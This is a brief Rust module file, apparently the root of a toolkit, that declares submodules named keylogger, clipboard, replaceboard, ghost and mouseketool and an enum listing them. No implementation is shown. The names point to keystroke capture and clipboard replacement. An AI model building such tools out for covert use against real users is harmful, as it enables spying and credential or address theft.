pub mod keylogger;
pub mod clipboard;
pub mod replaceboard;
pub mod ghost;
pub mod mouseketool;

pub enum Tool {
    Keylogger,
    Clipboard,
    ReplaceBoard,
    Ghost,
    Mouseketool,
    Invalid,
}
